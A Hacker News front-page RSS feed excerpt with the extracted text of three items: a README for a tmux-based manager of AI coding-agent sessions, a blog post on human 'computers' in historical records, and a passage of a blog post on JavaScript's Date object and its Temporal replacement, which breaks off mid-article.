<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Mon, 12 Jan 2026 23:09:13 +0000</lastBuildDate><item><title>Show HN: Agent-of-empires: OpenCode and Claude Code session manager</title><link>https://github.com/njbrake/agent-of-empires</link><description>&lt;doc fingerprint="e43055fb0d45e3b6"&gt;
  &lt;main&gt;
    &lt;p&gt;A terminal session manager for Linux and MacOS using tmux to aid in management and monitoring of AI coding agents, written in Rust.&lt;/p&gt;
    &lt;p&gt;Quick install (Linux &amp;amp; macOS):&lt;/p&gt;
    &lt;code&gt;curl -fsSL \
  https://raw.githubusercontent.com/njbrake/agent-of-empires/main/scripts/install.sh \
  | bash&lt;/code&gt;
    &lt;p&gt;Homebrew:&lt;/p&gt;
    &lt;code&gt;brew install njbrake/aoe/aoe&lt;/code&gt;
    &lt;p&gt;Update via &lt;code&gt;brew update &amp;amp;&amp;amp; brew upgrade aoe&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Build from source:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/njbrake/agent-of-empires
cd agent-of-empires
cargo build --release&lt;/code&gt;
    &lt;p&gt;Agent of Empires (aoe) is a wrapper around tmux, the terminal multiplexer. Each AI coding session you create is actually a tmux session under the hood.&lt;/p&gt;
    &lt;p&gt;Once you attach to a session, you're working directly in tmux. Basic tmux knowledge helps:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;tmux Command&lt;/cell&gt;
        &lt;cell role="head"&gt;What It Does&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+b d&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Detach from session (return to Agent of Empires)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+b [&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Enter scroll/copy mode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;Ctrl+b n&lt;/code&gt; / &lt;code&gt;Ctrl+b p&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Next/previous window&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;If you're new to tmux, the key thing to remember is &lt;code&gt;Ctrl+b d&lt;/code&gt; to detach and return to the TUI, and that with Claude Code you'll need to enter scroll mode in order to scroll up in the Claude Code window (this isn't necessary when using opencode).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TUI Dashboard - Visual interface to manage all your AI coding sessions&lt;/item&gt;
      &lt;item&gt;Session Management - Create, attach, detach, and delete sessions&lt;/item&gt;
      &lt;item&gt;Group Organization - Organize sessions into hierarchical folders&lt;/item&gt;
      &lt;item&gt;Status Detection - Automatic status detection for Claude Code and OpenCode&lt;/item&gt;
      &lt;item&gt;tmux Integration - Sessions persist in tmux for reliability&lt;/item&gt;
      &lt;item&gt;Multi-profile Support - Separate workspaces for different projects&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Launch the TUI
aoe

# Or add a session directly from CLI
aoe add /path/to/project&lt;/code&gt;
    &lt;p&gt;Profiles let you maintain separate workspaces with their own sessions and groups. This is useful when you want to keep different contexts isolated—for example, work projects vs personal projects, or different client engagements.&lt;/p&gt;
    &lt;code&gt;aoe                 # Uses "default" profile
aoe -p work         # Uses "work" profile
aoe -p client-xyz   # Uses "client-xyz" profile&lt;/code&gt;
    &lt;p&gt;Each profile stores its own &lt;code&gt;sessions.json&lt;/code&gt; and &lt;code&gt;groups.json&lt;/code&gt;, so switching profiles gives you a completely different set of sessions.&lt;/p&gt;
    &lt;p&gt;Configuration is stored in &lt;code&gt;~/.agent-of-empires/&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;~/.agent-of-empires/
├── config.toml           # Global configuration
├── profiles/
│   └── default/
│       ├── sessions.json # Session data
│       └── groups.json   # Group structure
└── logs/                 # Session logs
&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Variable&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;AGENT_OF_EMPIRES_PROFILE&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Default profile to use&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;AGENT_OF_EMPIRES_DEBUG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Enable debug logging&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;code&gt;# Check code
cargo check

# Run tests
cargo test

# Format code
cargo fmt

# Lint
cargo clippy

# Run in debug mode
AGENT_OF_EMPIRES_DEBUG=1 cargo run

# Build release binary
cargo build --release&lt;/code&gt;
    &lt;p&gt;If you're connecting via SSH from a mobile app like Termius, you may encounter issues when attaching to sessions. The recommended approach is to run &lt;code&gt;aoe&lt;/code&gt; inside a tmux session:&lt;/p&gt;
    &lt;code&gt;# Start a tmux session first
tmux new-session -s main

# Then run aoe inside it
aoe&lt;/code&gt;
    &lt;p&gt;When you attach to an agent session, tmux will switch to that session. To navigate back to &lt;code&gt;aoe&lt;/code&gt; use the tmux command &lt;code&gt;Ctrl+b L&lt;/code&gt; to switch to last session (toggle back to aoe)&lt;/p&gt;
    &lt;p&gt;This is not an issue with &lt;code&gt;aoe&lt;/code&gt;: it's a known problem with Claude Code: anthropics/claude-code#1913&lt;/p&gt;
    &lt;p&gt;Inspired by agent-deck (Go + Bubble Tea).&lt;/p&gt;
    &lt;p&gt;MIT License - see LICENSE for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46588905</guid><pubDate>Mon, 12 Jan 2026 14:23:07 +0000</pubDate></item><item><title>Computers that used to be human</title><link>https://digitalseams.com/blog/computers-that-used-to-be-human</link><description>&lt;doc fingerprint="177131c974e79170"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Computers that used to be human&lt;/head&gt;
    &lt;p&gt;One common complaint about computers is that they’re too hard to understand. Check out this lamentation related to the British East India Company:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The Controller and the Computer of the Duties on unrated India Goods attend the Sales of the East India Company, and take an Account of the Goods sold, and the Price; this Account is agreed with the Company, then the Controller and Computer cast the Duties, and the Receiver enters them upon the Warrant.&lt;/p&gt;&lt;p&gt;The Computation is become so difficult, from the Number of Branches of Duties, and from the various Rules now necessarily made use of in casting them, that very few Persons can be found capable of transacting this Business, or of acquiring the Means of doing it.&lt;/p&gt;&lt;p&gt;The Examination of Mr. William Richardson; taken upon Oath, the 3d of December 1784&lt;/p&gt;&lt;lb/&gt;Journals of the House of Commons (1785)&lt;/quote&gt;
    &lt;p&gt;Wait, what? In 1785, no British civil servant was pulling up Excel to do the books on colonialism (citation needed). Even Charles Babbage was still a twinkle in his parents’ eyes.&lt;/p&gt;
    &lt;p&gt;In the quoted passage, the Computer is a human. You used to be able to be a professional Computer, calculating important sums for your employer.&lt;/p&gt;
    &lt;p&gt;And just like computers today, those human Computers could be hard to understand. Imagine being a tax auditor or accountant by hand - no wonder this particular Computer, for taxes, was a very difficult job to hire for.&lt;/p&gt;
    &lt;p&gt;—&lt;/p&gt;
    &lt;p&gt;Computers were real people. They had names. Sometimes being a Computer was a quick gig between others, as this US Naval Observatory report shows:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The following members of the Observatory force have been attached to the computing division at some time during the year ending June 30, 1903:&lt;/p&gt;&lt;p&gt;Computer William M. Brown&lt;/p&gt;&lt;p&gt;Computer John C. Hammond&lt;/p&gt;&lt;p&gt;Computer Everett I. Yowell, for six months.&lt;/p&gt;&lt;p&gt;Computer Herbert R. Morgan.&lt;/p&gt;&lt;p&gt;Computer Eleanor A. Lamson&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Clara M. Upton, for two months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Arthur B. Turner, for six weeks.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Lelia J. Harvie, for six weeks.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Etta M. Eaton, for eight months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer John R. Benton, for two months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Ella A. Merritt, for seven months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Samuel F. Rixey, for four months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Delonza T. Wilson, for five months.&lt;/p&gt;&lt;p&gt;Miscellaneous Computer Charles E. Yost, for two weeks.&lt;/p&gt;&lt;p&gt;[...]&lt;/p&gt;&lt;p&gt;Very respectfully,&lt;/p&gt;&lt;lb/&gt;W.S. Eichelberger&lt;lb/&gt;Professor of Mathematics, U.S. Navy, in Charge.&lt;/quote&gt;
    &lt;p&gt;As popularly retold in Hidden Figures, human computers co-existed with electronic computers as late as the 1960s - real people, usually women, would perform calculations by hand and with tools like lookup tables, slide rules, and mechanical calculators.&lt;/p&gt;
    &lt;p&gt;Of course, Calculators also used to be people performing similar tasks. From the 1656 Glossographia, one of the earliest English dictionaries:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Calculate (calculo): to cast accounts, to reckon.&lt;/p&gt;
      &lt;p&gt;Compotist (compotista): a caster of accounts, a Reckoner, or Calculator.&lt;/p&gt;
      &lt;p&gt;Thomas Blount: Glossographia, or, A dictionary interpreting all such hard words of whatsoever language now used in our refined English tongue with etymologies, definitions and historical observations on the same : also the terms of divinity, law, physick, mathematicks and other arts and sciences explicated via the University of Michigan Library’s Early English Books Online&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Besides writing that hilariously-long subtitle, Thomas Blount believes that “reckon” is not a “hard word”, so it’s not included in this dictionary - too obvious, another example of “Everyone can see what a horse is”. In fact, I had a hard time finding any dictionary of this era that defined “reckon”, so here’s several entries from the 1604 A Table Alphabeticall that should help:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;[fr] account, reckon&lt;/p&gt;
      &lt;p&gt;computation, an account or reckoning&lt;/p&gt;
      &lt;p&gt;impute, reckon, or assigne, blame, or to lay to ones charge&lt;/p&gt;
      &lt;p&gt;register, kalender, a reckoning booke&lt;/p&gt;
      &lt;p&gt;Robert Cawdrey: A Table Alphabeticall (1604), website edited by Raymond G. Siemens&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;At this time, “reckon” had a meaning closer to “compute” or “calculate”, with numerical or financial precision (this is where the phrase “the day of reckoning” comes from). That’s quite distant from its modern meaning of a casual guess or tentative belief.&lt;/p&gt;
    &lt;p&gt;—&lt;/p&gt;
    &lt;p&gt;Now, doing real research takes a lot of time. The rest of this post is dedicated to making up stupid etymology because I think it’s funny:&lt;/p&gt;
    &lt;p&gt;Ruler as straightedge derives from ruler like the monarchy, since the king is the one who has to draw the line.&lt;/p&gt;
    &lt;p&gt;Protractor used to be someone who made meetings drag on longer by considering new angles (some say this role still exists today).&lt;/p&gt;
    &lt;p&gt;Washer-dryers used to be the same person, but it was divided into two distinct roles thanks to increasing specialization and powerful labor unions; never the twain shall meet again.&lt;/p&gt;
    &lt;p&gt;Liquor is too obscene to define here. I hardly even know her!&lt;/p&gt;
    &lt;p&gt;And if you believe the hype, Programmer might be next in line for tool-dom, like the Calculators and Computers of yore. Come to think of it, those folks can be hard to understand, too.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46589543</guid><pubDate>Mon, 12 Jan 2026 15:09:32 +0000</pubDate></item><item><title>Date is out, Temporal is in</title><link>https://piccalil.li/blog/date-is-out-and-temporal-is-in/</link><description>&lt;doc fingerprint="8a417811e99f2f1c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Date is out, Temporal is in&lt;/head&gt;
    &lt;p&gt;Time makes fools of us all, and JavaScript is no slouch in that department either. Honestly, I’ve never minded the latter much — in fact, if you’ve taken JavaScript for Everyone or tuned into the newsletter, you already know that I largely enjoy JavaScript’s little quirks, believe it or not.&lt;/p&gt;
    &lt;p&gt;I like when you can see the seams; I like how, for as formal and iron-clad as the ES-262 specification might seem, you can still see all the good and bad decisions made by the hundreds of people who’ve been building the language in mid-flight, if you know where to look. JavaScript has character. Sure, it doesn’t necessarily do everything exactly the way one might expect, but y’know, if you ask me, JavaScript has a real charm once you get to know it!&lt;/p&gt;
    &lt;p&gt;There’s one part of the language where that immediately falls apart for me, though.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;// Numeric months are zero-indexed, but years and days are not: console.log( new Date(2026, 1, 1) ); // Result: Date Sun Feb 01 2026 00:00:00 GMT-0500 (Eastern Standard Time)&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;The &lt;code&gt;Date&lt;/code&gt; constructor.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;// A numeric string between 32 and 49 is assumed to be in the 2000s: console.log( new Date( "49" ) ); // Result: Date Fri Jan 01 2049 00:00:00 GMT-0500 (Eastern Standard Time) // A numeric string between 33 and 99 is assumed to be in the 1900s: console.log( new Date( "99" ) ); // Result: Date Fri Jan 01 1999 00:00:00 GMT-0500 (Eastern Standard Time) // ...But 100 and up start from year zero: console.log( new Date( "100" ) ); // Result: Date Fri Jan 01 0100 00:00:00 GMT-0456 (Eastern Standard Time)&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;I dislike &lt;code&gt;Date&lt;/code&gt; immensely.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;// A string-based date works the way you might expect: console.log( new Date( "2026/1/2" ) ); // Result: Date Fri Jan 02 2026 00:00:00 GMT-0500 (Eastern Standard Time) // A leading zero on the month? No problem; one is one, right? console.log( new Date( "2026/02/2" ) ); // Result: Date Mon Feb 02 2026 00:00:00 GMT-0500 (Eastern Standard Time) // Slightly different formatting? Sure! console.log( new Date( "2026-02-2" ) ); // Result: Date Mon Feb 02 2026 00:00:00 GMT-0500 (Eastern Standard Time) // A leading zero on the day? Of course; why wouldn't it work? console.log( new Date('2026/01/02') ); // Result: Date Fri Jan 02 2026 00:00:00 GMT-0500 (Eastern Standard Time) // Unless, of course, you separate the year, month, and date with hyphens. // Then it gets the _day_ wrong. console.log( new Date('2026-01-02') ); // Result: Date Thu Jan 01 2026 19:00:00 GMT-0500 (Eastern Standard Time)&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;Date&lt;/code&gt; sucks. It was hastily and shamelessly copied off of Java’s homework in the car on the way to school and it got all the same answers wrong, right down to the name at the top of the page: &lt;code&gt;Date&lt;/code&gt; doesn’t represent a date, it represents a time. Internally, dates are stored as number values called time values: Unix timestamps, divided into 1,000 milliseconds — which, okay, yes, a Unix time does also necessarily imply a date, sure, but still: Date represents a time, from which you can infer a date. Gross.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;// Unix timestamp for Monday, December 4, 1995 12:00:00 AM GMT-05 (the day JavaScript was announced): const timestamp = 818053200; console.log( new Date( timestamp * 1000 ) ); // Result: Date Mon Dec 04 1995 00:00:00 GMT-0500 (Eastern Standard Time)&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Words like “date” and “time” mean things, but, sure — whatever, JavaScript.&lt;/p&gt;
    &lt;p&gt;Java deprecated their &lt;code&gt;Date&lt;/code&gt; way back in 1997, only a few years after JavaScript’s &lt;code&gt;Date&lt;/code&gt; was turned loose on the unsuspecting world; meanwhile, we’ve been saddled with this mess ever since. It’s wildly inconsistent when it comes to parsing dates, as you’ve seen so far here. It has no sense of time zones beyond the local one and GMT, which is not ideal where “world-wide” is right there in the web’s name — and speaking-of, &lt;code&gt;Date&lt;/code&gt; only respects the Gregorian calendar model. It wholesale does not understand the concept of daylight savings time, which— I mean, okay, yeah, samesies, but I’m not made of computers. All these shortcomings make it exceptionally common to use a third-party library dedicated to working around it all, some of which are absolutely massive; a performance drain that has done real and measurable damage to the web.&lt;/p&gt;
    &lt;p&gt;None of these are my major issue with &lt;code&gt;Date&lt;/code&gt;. My complaint is about more than parsing or syntax or “developer ergonomics” or the web-wide performance impact of wholly necessary workarounds or even the definition of the word “date.” My issue with &lt;code&gt;Date&lt;/code&gt; is soul-deep. My problem with &lt;code&gt;Date&lt;/code&gt; is that using it means deviating from the fundamental nature of time itself.&lt;/p&gt;
    &lt;p&gt;All JavaScript’s primitives values are immutable, meaning that the values themselves cannot be changed. The number value &lt;code&gt;3&lt;/code&gt; can never represent anything but the concept of “three” — you can’t make &lt;code&gt;true&lt;/code&gt; mean anything other than “true.” These are values with concrete, iron-clad, real-world meanings. We know what three is. It can’t be some other non-three thing. These immutable data types are stored by value, meaning that a variable that represents the number value &lt;code&gt;3&lt;/code&gt; effectively “contains” — and thus behaves as — the number value &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When an immutable value is assigned to a variable, the JavaScript engine creates a copy of that value and stores the copy in memory:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theNumber = 3; console.log( theNumber ); // Result: 3&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;This fits the common mental model for “a variable” just fine: &lt;code&gt;theNumber&lt;/code&gt; “contains” &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When we initialize &lt;code&gt;theOtherNumber&lt;/code&gt; with the value bound to &lt;code&gt;theNumber&lt;/code&gt;, that mental model holds: once again a &lt;code&gt;3&lt;/code&gt; is created and stored in memory. &lt;code&gt;theOtherNumber&lt;/code&gt; can now be thought of as containing its own discrete &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theNumber = 3; const theOtherNumber = theNumber; console.log( theOtherNumber ); // Result: 3;&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;The value of &lt;code&gt;theNumber&lt;/code&gt; isn’t changed when we alter the value associated with &lt;code&gt;theOtherNumber&lt;/code&gt;, of course — again, we’re working with two discrete instances of &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theNumber = 3; let theOtherNumber = theNumber; theOtherNumber = 5; console.log( theOtherNumber ); // Result: 5; console.log( theNumber ); // Result: 3&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;When you change the value bound to &lt;code&gt;theOtherNumber&lt;/code&gt;, you’re not changing the &lt;code&gt;3&lt;/code&gt;, you’re creating a new, immutable number value and binding that in its place. Hence an error when you try to tinker with a variable declared using &lt;code&gt;const&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theNumber = 3; theNumber = 5; // Result: Uncaught TypeError: invalid assignment to const 'theNumber'&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;You can’t change the binding of a &lt;code&gt;const&lt;/code&gt;, and you definitely can’t alter the meaning of &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Data types that can be changed after they’re created are mutable, meaning that the data value itself can be altered. Object values — any non-primitive value, like an array, map, or set — are mutable.&lt;/p&gt;
    &lt;p&gt;Variables (and object properties, function parameters, and elements in an array, set, or map) can’t “contain” an object, the way we might think of &lt;code&gt;theNumber&lt;/code&gt; in the example above as “containing” &lt;code&gt;3&lt;/code&gt;. A variable can contain either a primitive value or a reference value, the latter of which is a pointer to that object’s stored location in memory. When you assign an object to a variable, instead of creating a copy of that object, the identifier represents a reference to the object’s stored position in memory. That’s why an object bound to a variable declared with &lt;code&gt;const&lt;/code&gt; can still be altered: the reference value can’t be changed, but the values of the object can:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theObject = { theValue : 3 }; theObject.theValue++; console.log( theObject.theValue ); // Result: 4&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;You still can’t change the binding of a &lt;code&gt;const&lt;/code&gt;, but you can alter the object that binding references.&lt;/p&gt;
    &lt;p&gt;When a reference value is assigned from one variable to another, the JavaScript engine creates a copy of that reference value — not the object value itself, the way a discrete copy is made of a primitive value. Both identifiers point to the same object in memory — any changes made to that object by way of one reference will be reflected by the others, because they’re all referencing the same thing:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theObject = { theValue : 3 }; const theOtherObj = theObject; theOtherObj.theValue++; console.log( theOtherObj.theValue ); // Result: 4 console.log( theObject.theValue ); // Result: 4&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;This is what gets me about JavaScript’s date handling. Despite representing “point to it on a calendar” values, JavaScript’s date values are mutable — &lt;code&gt;Date&lt;/code&gt; is a constructor, invoking a constructor with &lt;code&gt;new&lt;/code&gt; necessarily results in an object, and all objects are inherently mutable:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theDate = new Date(); console.log( typeof theDate ); // Result: object&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Even though “January 1st, 2026” is as much an immutable real-world concept as “three” or “true,” the only way we have of representing that date is a with a mutable data structure.&lt;/p&gt;
    &lt;p&gt;This also means that any variable initialized with an instance of the &lt;code&gt;Date&lt;/code&gt; constructor contains a reference value, pointing to a data value in memory that can be changed by way of any reference to that value:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const theDate = new Date(); console.log( theDate.toDateString() ); // Result: Tue Dec 30 2025 theDate.setMonth( 10 ); console.log( theDate.toDateString() ); // Result: Sun Nov 30 2025&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Again, we’re going to breeze right over the fact that month &lt;code&gt;10&lt;/code&gt; is November.&lt;/p&gt;
    &lt;p&gt;So despite real-world dates having set-in-stone meanings, the process of interacting with an instance of &lt;code&gt;Date&lt;/code&gt; that represents that real-world value can mean altering that instance in ways we didn’t necessarily intend:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const today = new Date(); const addDay = theDate =&amp;gt; { theDate.setDate( theDate.getDate() + 1 ); return theDate; }; console.log(`Today is ${ today.toLocaleDateString() }, tomorrow is ${ addDay( today ).toLocaleDateString() }.`); // Result: Today is 12/31/2025. Tomorrow is 1/1/2026.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Fine so far, right? Today is today, tomorrow is tomorrow; all is right in the world. You’d be forgiven for committing this to a codebase and moving on with your day. That is, unless we reordered the output slightly.&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const today = new Date(); const addDay = theDate =&amp;gt; { theDate.setDate( theDate.getDate() + 1 ); return theDate; }; console.log(`Tomorrow will be ${ addDay( today ).toLocaleDateString() }. Today is ${ today.toLocaleDateString() }.`); // Result: Tomorrow will be 1/1/2026. Today is 1/1/2026.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;See what happened there? the variable &lt;code&gt;today&lt;/code&gt; represents a reference to the object created by &lt;code&gt;new Date()&lt;/code&gt;. When we provided &lt;code&gt;today&lt;/code&gt; as an argument to the &lt;code&gt;addDay&lt;/code&gt; function, the parameter &lt;code&gt;theDate&lt;/code&gt; now represents a copy of the reference value — not a copy of the value, but a second reference to the object that represents today’s date. When we manipulate that value to determine the date of the following day, we’re manipulating the mutable object in memory, not an immutable copy — today becomes tomorrow, the falcon has a hard time hearing the falconer, the center starts to look a little iffy vis-a-vis “holding,” and so on.&lt;/p&gt;
    &lt;p&gt;Now, by this point you can probably tell that I’m not here to praise &lt;code&gt;Date&lt;/code&gt;, but what you might not expect is that I’m here to bury it. That’s right: &lt;code&gt;Date&lt;/code&gt; is soon to be over, done, gone, as “deprecated” as any part of the web platform can be — which is to say, “around forever, but you shouldn’t use it anymore, if you can avoid it.” Soon we will — at long last — have an object that replaces &lt;code&gt;Date&lt;/code&gt; wholesale: &lt;code&gt;Temporal&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Temporal is not a constructor, it’s a namespace object&lt;/head&gt;
    &lt;p&gt;The sharp-eyed among you may have noticed that I said “an object that replaces &lt;code&gt;Date&lt;/code&gt;,” not “a constructor.” &lt;code&gt;Temporal&lt;/code&gt; is not a constructor, and your browser’s developer console will tell you the same if you attempt to invoke it as one:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;const today = new Temporal(); // Uncaught TypeError: Temporal is not a constructor&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;Temporal&lt;/code&gt; is a way better name for something that pertains to time, if you ask me.&lt;/p&gt;
    &lt;p&gt;Instead, &lt;code&gt;Temporal&lt;/code&gt; is a namespace object — an ordinary object made up of static properties and methods, like the &lt;code&gt;Math&lt;/code&gt; object:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;code&gt;console.log( Temporal ); /* Result (expanded): Temporal { … } Duration: function Duration() Instant: function Instant() Now: Temporal.Now { … } PlainDate: function PlainDate() PlainDateTime: function PlainDateTime() PlainMonthDay: function PlainMonthDay() PlainTime: function PlainTime() PlainYearMonth: function PlainYearMonth() ZonedDateTime: function ZonedDateTime() Symbol(Symbol.toStringTag): "Temporal" */&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;I find this immediately understandable compared to &lt;code&gt;Date&lt;/code&gt;.  The classes and namespaces objects that &lt;code&gt;Temporal&lt;/code&gt; contains allow you to calculate durations between two points in time, represent a point in time with or without time zone specificity, or access the current moment in time via the &lt;code&gt;Now&lt;/code&gt; property. &lt;code&gt;Temporal.Now&lt;/code&gt; references a namespace object containing properties and methods of its own:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Code language&lt;/item&gt;
      &lt;item rend="dd-1"&gt;js&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
